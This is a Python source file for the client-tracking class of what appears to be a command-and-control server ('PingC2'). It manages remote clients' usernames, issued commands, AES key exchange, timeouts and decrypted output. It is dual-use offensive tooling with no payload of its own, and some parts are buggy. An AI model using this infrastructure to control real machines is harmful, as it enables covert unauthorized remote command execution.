from prompt_toolkit import print_formatted_text, HTML
from prompt_toolkit.formatted_text import FormattedText
from prompt_toolkit.styles import Style
from crypto import *
import os
import datetime
from time_manager import *

style = Style.from_dict({
    'red': 'ansired',
    'green': 'ansigreen',
    'greenb': 'ansigreen bold',
    'bold_blue': 'ansiblue bold',
    'bright_yellow': 'ansiyellow',
    'bg_magenta': 'bg:ansimagenta',
    'bg_rgb': 'bg:#222222',
    'fg_rgb': '#ff00ff',
    'bright': 'ansiwhite bold',
    'ul_bold':'underline bold'
})



class Client:
    def __init__(self, id, encrypted_hex_block, client_manager):

        self._timer_manager = TimerManager()
        self.client_manager = client_manager
        self._id = id
        self._whoami = ""
        self._command_executing = False
        self._block = True
        self._server_command = ""
        self._executed_command = ""
        self._client_response = ""
        self._encrypted_hex_list = []
        self._encrypted_hex_block = encrypted_hex_block
        self._decrypted = ""
        self._client_ready = False
        self._timeout = 10
        self._packet_delay = 0.1
        self._blocksize = 32
        self._aes_key = ""
        self._aes_nonce = ""
        self._updateAES = False
        self._ping_encrypted = ""

        self._raw_encrypted = ""
        self._interim_decrypted = ""

    # Getters
    def get_id(self):
        return self._id

    def get_whoami(self):
        return self._whoami

    def get_time_manager(self):
        return self._timer_manager

    def get_command_executing(self):
        return self._command_executing

    def get_block(self):
        return self._block

    def get_server_command(self):
        return self._server_command

    def get_executed_command(self):
        return self._executed_command

    def get_client_response(self):
        return self._client_response

    def get_encrypted_hex_list(self):
        return self._encrypted_hex_list

    def get_encrypted_hex_block(self):
        return self._encrypted_hex_block

    def get_decrypted(self):
        return self._decrypted

    def get_client_ready(self):
        return self._client_ready

    def get_timeout(self):
        return self._timeout

    def get_packet_delay(self):
        return self._packet_delay

    def get_blocksize(self):
        return self._blocksize

    def get_raw_encrypted(self):
        return self._raw_encrypted

    def get_interim_decrypted(self):
        return self._interim_decrypted

    def get_aes_key(self):
        return self._aes_key

    def get_aes_nonce(self):
        return self._aes_nonce    

    def get_ping_encrypted(self):
        return self._ping_encrypted

    def getUpdateAES(self):
        return self._updateAES

    # Setters
    def set_id(self, value):
        self._id = value

    def set_whoami(self, value):
        self._whoami = value

    def set_command_executing(self, value):
        self._command_executing = value

    def set_block(self, value):
        self._block = value

    def set_server_command(self, value):
        self._server_command = value

    def set_executed_command(self, value):
        self._executed_command = value

    def set_client_response(self, value):
        self._client_response = value

    def set_encrypted_hex_list(self, value):
        self._encrypted_hex_list.append(value)

    def set_encrypted_hex_block(self, value):
        self._encrypted_hex_block += value

    def set_decrypted(self, value):
        self._decrypted = value

    def set_client_ready(self, value):
        self._client_ready = value

    def set_timeout(self, value):
        self._timeout = value

    def set_packet_delay(self, value):
        self._packet_delay = value

    def set_blocksize(self, value):
        self._blocksize = value

    def set_raw_encrypted(self, value):
        self._raw_encrypted += value

    def set_interim_decrypted(self, value):
        self._interim_decrypted = value

    def clear_raw_encrypted(self):
        self._raw_encrypted = ""

    def clear_encrypted_hex_block(self):
        self._encrypted_hex_block = ""     

    def set_aes_key(self, value):
        self._aes_key = value
    
    def set_aes_nonce(self, value):
        self._aes_nonce = value

    def set_ping_encrypted(self, value):
        self._ping_encrypted = value

    def setUpdateAES(self, value):
        self._updateAES = value

    # other functions

    def remove(self):
        # Call remove_client method from ClientManager instance
        self.cleanup()
        self.client_manager.remove_client(self)

    def initialize(self):
        aes_key, aes_nonce = decrypt_aes_nonce(remove_padded_zeroes(self.get_encrypted_hex_block()))
        self.set_aes_key(aes_key)
        self.set_aes_nonce(aes_nonce)
        # The init packets comes in the following format:
        # Encrypted AES key and nonce (first 280 bytes) + encrypted result of "whoami" (remaining bytes)
        self.set_whoami(decrypt_msg_gcm(
            self.get_aes_key(),
            self.get_aes_nonce(),
            remove_padded_zeroes(self.get_encrypted_hex_block()[280:])
        ).split()[1])
        self.activate_client()

        self.cleanup()  # make client ready for next payload
        self.set_server_command("INIT OK")  # Let CLIENT know that SERVER successfully received and decrypted the generated key and nonce

    def activate_client(self):
        self.get_time_manager().start_timer(self._id)
        print_formatted_text(FormattedText([
            ('class:bright', '[INFO] '),
            ('class:green', f'Client: {self._id} connected.')
        ]), style=style)
        self.set_client_ready(True)

    def activate(self):
        self.set_client_ready(True)
        self.get_time_manager().start_timer(self._id)

    def updateAES(self):
        aes_key_new, aes_nonce_new = decrypt_aes_nonce(remove_padded_zeroes(self.get_encrypted_hex_block()))
        self.set_client_response(decrypt_msg_gcm(self.get_aes_key(), self.get_aes_nonce(),
                                                   remove_padded_zeroes(self.get_encrypted_hex_block()[280:])))
        self.set_aes_key(aes_key_new)
        self.set_aes_nonce(aes_nonce_new)

    def update(self):
        if self._command_executing:
            self._timer_manager.start_timer(self._id)
    
    def handle_response(self):
        if "OK: Exit" in self._client_response:
            self.remove()
            self.cmd_status("green", "successfully disconnected from the server")
            return "disconnected"
        if "OK: Cancel" in self._client_response:
            print("OK: CANCEL")
            self.cmd_status("green", f"successfully canceled execution of command: {' '.join(self._client_response.split()[2:])}")
            self.cleanup()
            return
        if "AESU" in self._client_response and self.getUpdateAES():
            self.cmd_status("green", "AES key and nonce updated")
            self.set_ping_encrypted("")
            self.setUpdateAES(False)
        if "OK" in self._client_response or "Rcode:0" in self._client_response:
            self.cmd_status("green", "successfully executed")
        if "PingC2 terminated" in self._client_response:    
            return "disconnected"
        if "Error: " in self._client_response:
            self.cmd_status("red", "failed executing")
        if "timeout changed" in self._client_response:
            self._timeout = self._client_response.split()[4][:-1]
        if "packet_delay changed" in self._client_response:
            self._packet_delay = self._client_response.split()[4][:-1]
        if "blocksize changed" in self._client_response:
            self.set_blocksize(self.get_client_response().split()[4])

    def cmd_status(self, color, status):
        first = f'Client: {self._id} {status} \'{self.get_executed_command()}\'\n\n ' if len(self.get_executed_command()) > 0 else f'Client: {self._id} {status}'
        second = f'Result: {self._client_response[:500]}...' if len(self._client_response) > 500 else f'Result: {self._client_response[:500]}'
        
        print_formatted_text(FormattedText([
                
                ('class:bright', '\n' + "[client response]" + "\n"),
                (f'class:{color}', first),
                (f'class:{color}', second),
                ('class:bright', f'\nComplete result in output file: {self._id}_output.txt' if len(self._client_response) > 500 else ''),
                
                
            ]), style=style)     
        self.set_executed_command("")


    def log(self):
        date_time = datetime.datetime.now().strftime("%D - %H:%M:%S UTC")
        pass

    def cleanup(self):
        self._command_executing = False
        self._interim_decrypted = ""
        self._raw_encrypted = ""
        self._encrypted_hex_list = []
        self._encrypted_hex_block = ""
        if self._client_response == "!ping":
            self.set_client_response("")


    def check_if_alive(self):
         # Check if client connected
        if self._timer_manager.get_elapsed_time(self._id) > int(self._timeout)+3:
            self.set_client_ready(False)
            return False
        else:
            return True

    def print_info(self, active_client):
        # fix padding
        username = "{:<30}".format(self._whoami.replace('\n',''))[0:30]
        cmd = "{:<30}".format(self._server_command.replace('\n',''))[0:30]
        timeout = "{:<15}".format(str(self._timer_manager.get_elapsed_time(self._id)) + f"/{self._timeout}s" if self._command_executing == False else "(Executing...)")

        # Check if client connected
        try:
            if self._timer_manager.get_elapsed_time(self._id) > int(self._timeout): # BUG here
                self._client_ready = False
            else:
                self._client_ready = True
            if self._id == active_client:
                color_style = "class:greenb"
            else:
                color_style = "class:green"
            # print info on each client connected
            print_formatted_text(FormattedText([
                (color_style, f"{self._id}\t\t{username}\t\t"),
                (color_style if self._client_ready else 'class:red',f"{timeout}"),
                (color_style, f"\t\t{cmd}\t\t{self._id}_output.txt\n")
            ]), style=style)
        except Exception as error:
            print("print_info(), ", error)


    def print_decrypted(self):
        test3 = self._decrypted.split("\n")

        cols = os.get_terminal_size().columns
        rows = os.get_terminal_size().lines
        longer = False
        longest_line_index = 0
        longest_line = 0
        for index, line in enumerate(test3):
            if len(line) > cols:
                longer = True
            if len(line) > longest_line:
                longest_line_index = index
                longest_line = len(line)

        #print(longest_line)
        if longer:
            n = cols - 6
            test2 = [self._decrypted.replace("\n\n","")[i:i+n] for i in range(0, len(self._decrypted), n)]

            print("_"*(n+2))

            for i in test2:
                if i == test2[-1]:
                    print("|" + i + (full_length-len(i))*" " + " |")
                else:
                    full_length = len(i)
                    print("|" + i + " |")
            print("|" + (n+1)*"_" + "|\n")
        else:
            print("_"*(longest_line+1))
            for line in test3:
                print("|" + line + (longest_line-len(line))*" " + "|")
            print("|" + (longest_line)*"_" + "|\n")

   # Method to nicely print out all attributes in a table using prompt_toolkit
    def print_attributes(self):
        style = Style.from_dict({
            'attribute': 'bold #90ff33',   # Coral color for attribute names
            'value': '#1f75fe',            # Blue color for values
        })

        attributes = [
            ("ID", self._id),
            ("User", self._whoami),
            ("Server Command", self._server_command),
            ("Client Response", self._client_response),
            ("AES key", self._aes_key),
            ("AES nonce", self._aes_nonce),
            ("Encrypted hex", self._encrypted_hex_block),
            ("Decrypted", self._decrypted),

            ("Command Executing", self._command_executing),
            ("Client Ready", self._client_ready),
            ("Timeout", self._timeout),
            ("Packet Delay", self._packet_delay),
            ("Block", self._block),
            ("Block Size", self._blocksize),
        ]

        #   print_formatted_text(HTML('<ansiyellow>MyClass Attributes:</ansiyellow>'), style=style)
        for attr, value in attributes:
            if attr == "Decrypted":
                print_formatted_text(
                    HTML(f'<attribute>{attr:<30}</attribute> \n<value>{value}</value>\n'),
                    style=style
                )
            else:

                print_formatted_text(
                    HTML(f'<attribute>{attr:<30}</attribute> <value>{value}</value>'),
                    style=style
                )